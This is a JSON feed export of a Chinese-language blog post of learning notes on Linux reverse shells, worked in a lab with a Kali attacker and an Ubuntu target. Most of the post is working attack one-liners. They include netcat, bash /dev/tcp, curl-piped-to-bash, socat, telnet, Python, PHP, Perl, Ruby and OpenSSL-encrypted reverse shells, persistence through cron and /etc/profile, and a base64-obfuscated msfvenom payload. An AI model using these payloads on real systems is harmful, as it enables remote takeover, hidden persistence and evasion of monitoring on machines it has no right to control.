{
    "version": "https://jsonfeed.org/version/1",
    "title": "Go Forward • All posts by \"linux反弹shell多种姿态\" tag",
    "description": "欢迎来到我的博客(*^﹏^*),本人为新人,你可以阅读我的学习笔记并提出独到的见解~我们将互相学习,共同进步,望大佬们勿喷",
    "home_page_url": "https://chungod.github.io",
    "items": [
        {
            "id": "https://chungod.github.io/2021/05/14/Linux%E5%8F%8D%E5%BC%B9shell%E5%A4%9A%E7%A7%8D%E5%A7%BF%E6%80%81/",
            "url": "https://chungod.github.io/2021/05/14/Linux%E5%8F%8D%E5%BC%B9shell%E5%A4%9A%E7%A7%8D%E5%A7%BF%E6%80%81/",
            "title": "Linux反弹shell多种姿态",
            "date_published": "2021-05-14T12:19:41.000Z",
            "content_html": "<h2 id=\"linux-反弹shell多种姿态\"><a class=\"markdownIt-Anchor\" href=\"#linux-反弹shell多种姿态\">#</a> Linux 反弹 shell 多种姿态</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">原理:反弹shell就是控制端监听在某TCP/UDP端口，目标机主动发起请求到攻击机监听的端口，并将其命令行的输入输出转到攻击机</span><br></pre></td></tr></table></figure>\n<p>一般反弹 shell 分为两种</p>\n<ul>\n<li>正向连接</li>\n</ul>\n<p>用于情况一般为我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标 ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web 服务、ssh、telnet 等等都是正向连接。</p>\n<ul>\n<li>反向连接</li>\n</ul>\n<p>反弹 shell 通常适用于如下几种情况：</p>\n<ol>\n<li>目标机因防火墙受限，目标机器只能发送请求，不能接收请求。</li>\n<li>目标机端口被占用。</li>\n<li>目标机位于局域网，或 IP 会动态变化，攻击机无法直接连接。</li>\n<li>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知的。</li>\n</ol>\n<p>实验坏境</p>\n<p>攻击机：Kali（172.16.9.200）</p>\n<p>目标主机：Ubuntu（172.16.9.199）</p>\n<h3 id=\"普通反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#普通反弹shell\">#</a> 普通反弹 shell</h3>\n<p>攻击机开启本地监听</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvvp 3333</span><br></pre></td></tr></table></figure>\n<p>目标机主动连接攻击机</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">netcat 172.16.9.200 3333 -e /bin/bash</span><br></pre></td></tr></table></figure>\n<p>执行效果：</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210514112125091.png\" alt=\"image-20210514112125091\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210514112117079.png\" alt=\"image-20210514112117079\"></p>\n<h3 id=\"利用bash反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#利用bash反弹shell\">#</a> 利用 Bash 反弹 shell</h3>\n<p>攻击机开启本地监听</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvvp 3333</span><br></pre></td></tr></table></figure>\n<p>目标机主动连接攻击机</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; /dev/tcp/172.16.9.200/3333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n<p>执行效果，直接获取到 bash</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210514112313985.png\" alt=\"image-20210514112313985\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210514112324027.png\" alt=\"image-20210514112324027\"></p>\n<h3 id=\"curl配合bash反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#curl配合bash反弹shell\">#</a> Curl 配合 Bash 反弹 shell</h3>\n<p>攻击机开启本地监听</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvvp 3333</span><br></pre></td></tr></table></figure>\n<p>目标机 这里操作也很简单，借助了 Linux 中的管道</p>\n<p>首先，在攻击者 vps 的 web 目录里面创建一个 <code>index文件</code> （index.php 或 index.html），内容如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /var/www/html/index.html</span><br><span class=\"line\">bash -i &gt;&amp; /dev/tcp/172.16.9.200/3333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n<p>并开启 3333 端口的监听，然后再目标机上执行如下，即可反弹 shell：<img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210514112954090.png\" alt=\"image-20210514112954090\"></p>\n<p>执行效果：</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210514113144365.png\" alt=\"image-20210514113144365\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210514113155864.png\" alt=\"image-20210514113155864\"></p>\n<p>Curl 配合 Bash 反弹 shell 的方式在 CTF 题目中经常出现， <code>curl IP|bash</code>  中的 IP 可以是任意格式的，可以是十进制、十六进制、八进制、二进制等等。</p>\n<h3 id=\"写入定时任务反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#写入定时任务反弹shell\">#</a> 写入定时任务反弹 shell</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">我们可以在目标主机的定时任务文件中写入一个反弹shell的脚本，但是前提是我们必须要知道目标主机当前的用户名是哪个。因为我们的反弹shell命令是要写在 /var/spool/cron/[crontabs]/&lt;username&gt; 内的，所以必须要知道远程主机当前的用户名。否则就不能生效。</span><br></pre></td></tr></table></figure>\n<ul>\n<li>当前用户名为 root，我们就要将下面内容写入到 /var/spool/cron/root 中。(centos 系列主机)</li>\n<li>当前用户名为 root，我们就要将下面内容写入到 /var/spool/cron/crontabs/root 中。(Debian/Ubuntu 系列主机)</li>\n</ul>\n<p>实现效果</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210514142719763.png\" alt=\"image-20210514142719763\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210514142726506.png\" alt=\"image-20210514142726506\"></p>\n<h3 id=\"写入etcprofile文件反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#写入etcprofile文件反弹shell\">#</a> 写入 /etc/profile 文件反弹 shell</h3>\n<p>将以下反弹 shell 的命写入 /etc/profile 文件中，/etc/profile 中的内容会在用户打开 bash 窗口时执行。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/bin/bash -i &gt;&amp; /dev/tcp/172.16.9.200/3333 0&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210514142942758.png\" alt=\"image-20210514142942758\"></p>\n<p>当目标主机管理员远程连接该主机时，就会执行该命令，成功获得目标机的 shell：</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210514143946125.png\" alt=\"image-20210514143946125\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210514144000488.png\" alt=\"image-20210514144000488\"></p>\n<h3 id=\"利用socat反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#利用socat反弹shell\">#</a> 利用 socat 反弹 shell</h3>\n<p>攻击机开启本地监听</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">socat TCP-LISTEN:2222 - 或</span><br><span class=\"line\">nc -lvvp 2222</span><br></pre></td></tr></table></figure>\n<p>目标机主动连接主机</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">socat tcp-connect:172.16.9.200:2222 exec:&#x27;bash -li&#x27;,ptr,stderr,setsid,sight,sane</span><br></pre></td></tr></table></figure>\n<p>实现效果</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210514145043081.png\" alt=\"image-20210514145043081\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210514145051036.png\" alt=\"image-20210514145051036\"></p>\n<h3 id=\"利用telnet反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#利用telnet反弹shell\">#</a> 利用 telnet 反弹 shell</h3>\n<p>攻击机开启本地监听</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvvp 2222</span><br></pre></td></tr></table></figure>\n<p>目标机主动连接主机</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mknod a p; telnet 172.16.9.200 2222 0&lt;a | /bin/bash 1&gt;a</span><br></pre></td></tr></table></figure>\n<p>实现效果</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210514145347386.png\" alt=\"image-20210514145347386\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210514145359190.png\" alt=\"image-20210514145359190\"></p>\n<h2 id=\"各种脚本反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#各种脚本反弹shell\">#</a> 各种脚本反弹 shell</h2>\n<h3 id=\"python脚本反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#python脚本反弹shell\">#</a> python 脚本反弹 shell</h3>\n<p>攻击机开启本地监听</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvvp 2222</span><br></pre></td></tr></table></figure>\n<p>目标机主动连接主机</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python -c <span class=\"string\">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;172.16.9.200&quot;,2222));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210514145830300.png\" alt=\"image-20210514145830300\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210514145838061.png\" alt=\"image-20210514145838061\"></p>\n<h3 id=\"php脚本反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#php脚本反弹shell\">#</a> php 脚本反弹 shell</h3>\n<p>攻击机开启本地监听</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvvp 2222</span><br></pre></td></tr></table></figure>\n<p>目标机主动连接主机 (一)</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php -r <span class=\"string\">&#x27;$sock=fsockopen(&quot;172.16.9.200&quot;,2222);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210514150401946.png\" alt=\"image-20210514150401946\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210514150354093.png\" alt=\"image-20210514150354093\"></p>\n<p>目标机主动连接主机 (二)</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php -r <span class=\"string\">&#x27;exec(&quot;/bin/bash -i &gt;&amp; /dev/tcp/172.16.9.200/2222 0&gt;&amp;1&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>实现效果</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210514151453583.png\" alt=\"image-20210514151453583\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210514151533954.png\" alt=\"image-20210514151533954\"></p>\n<h3 id=\"perl脚本反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#perl脚本反弹shell\">#</a> perl 脚本反弹 shell</h3>\n<p>攻击机开启本地监听</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvvp 2222</span><br></pre></td></tr></table></figure>\n<p>目标主机连接攻击机</p>\n<figure class=\"highlight perl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">perl -e <span class=\"string\">&#x27;use Socket;$i=&quot;172.16.9.200&quot;;$p=2222;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>实现效果</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210514152127846.png\" alt=\"image-20210514152127846\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210514152135839.png\" alt=\"image-20210514152135839\"></p>\n<h3 id=\"ruby脚本反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#ruby脚本反弹shell\">#</a> Ruby 脚本反弹 shell</h3>\n<p>攻击机开启本地监听</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvvp 2222</span><br></pre></td></tr></table></figure>\n<p>目标主机连接攻击机</p>\n<figure class=\"highlight ruby\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ruby -rsocket -e <span class=\"string\">&#x27;c=TCPSocket.new(&quot;172.16.9.200&quot;,&quot;2222&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br><span class=\"line\">或</span><br><span class=\"line\">ruby -rsocket -e <span class=\"string\">&#x27;exit if fork;c=TCPSocket.new(&quot;172.16.9.200&quot;,&quot;2222&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>实现效果</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210514153951128.png\" alt=\"image-20210514153951128\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210514153957273.png\" alt=\"image-20210514153957273\"></p>\n<h3 id=\"利用metasploit生成反弹shell一句话\"><a class=\"markdownIt-Anchor\" href=\"#利用metasploit生成反弹shell一句话\">#</a> 利用 metasploit 生成反弹 shell 一句话</h3>\n<p>攻击机开启本地监听</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvvp 2222</span><br></pre></td></tr></table></figure>\n<p>我们直接可以使用<strong> msfvenom -l</strong> 结合关键字过滤（如 = cmd/unix/reverse），列出我们需要生成的各类反弹 shell 一句话的 payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfvenom -l payloads | grep &#x27;cmd/unix/reverse&#x27;</span><br></pre></td></tr></table></figure>\n<p>生成一个 python 反弹 shell 的一句话</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfvenom -p cmd/unix/reverse_python LHOST=172.16.9.200 LPORT=3333 -f raw &gt; shell.py</span><br><span class=\"line\">cat shell.py</span><br></pre></td></tr></table></figure>\n<p>将 shell.py 内容复制到目标主机进行执行</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210514154549401.png\" alt=\"image-20210514154549401\"></p>\n<p>目标主机执行</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python -c <span class=\"string\">&quot;exec(__import__(&#x27;base64&#x27;).b64decode(__import__(&#x27;codecs&#x27;).getencoder(&#x27;utf-8&#x27;)(&#x27;aW1wb3J0IHNvY2tldCAgICAgICAgLCAgICAgc3VicHJvY2VzcyAgICAgICAgLCAgICAgb3MgIDsgICAgICAgICBob3N0PSIxNzIuMTYuOS4yMDAiICA7ICAgICAgICAgcG9ydD0yMjIyICA7ICAgICAgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVUICAgICAgICAsICAgICBzb2NrZXQuU09DS19TVFJFQU0pICA7ICAgICAgICAgcy5jb25uZWN0KChob3N0ICAgICAgICAsICAgICBwb3J0KSkgIDsgICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAgICAgICwgICAgIDApICA7ICAgICAgICAgb3MuZHVwMihzLmZpbGVubygpICAgICAgICAsICAgICAxKSAgOyAgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICAgLCAgICAgMikgIDsgICAgICAgICBwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoIik=&#x27;)[0]))&quot;</span></span><br></pre></td></tr></table></figure>\n<p>实现效果</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210514154730993.png\" alt=\"image-20210514154730993\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210514154739869.png\" alt=\"image-20210514154739869\"></p>\n<h3 id=\"利用openssl反弹加密shell\"><a class=\"markdownIt-Anchor\" href=\"#利用openssl反弹加密shell\">#</a> 利用 OpenSSL 反弹加密 shell</h3>\n<p>如果我们需要对通信的内容进行混淆或加密，这时可以选择使用 OpenSSL 反弹一个加密的 shell。</p>\n<p>首先在攻击机 kali 生成自签名证书</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210514160946360.png\" alt=\"image-20210514160946360\"></p>\n<p>利用上一步生成的自签名证书，在攻击机上使用 OpenSSL 监听一个端口</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">openssl s_server -quiet -key key.pem -cert cert.pem -port 2222</span><br></pre></td></tr></table></figure>\n<p>目标机进行反弹 shell 操作</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 172.16.9.200:2222 &gt; /tmp/s; rm /tmp/s</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210514161122042.png\" alt=\"image-20210514161122042\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210514161128816.png\" alt=\"image-20210514161128816\"></p>\n<h3 id=\"扩展反弹shell后获取终端\"><a class=\"markdownIt-Anchor\" href=\"#扩展反弹shell后获取终端\">#</a> 扩展反弹 shell 后获取终端</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class=\"line\">python -c &#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br><span class=\"line\">/bin/bash -i</span><br><span class=\"line\">echo os.system(&quot;/bin/bash&quot;);</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "Linux反弹shell多种姿态"
            ]
        }
    ]
}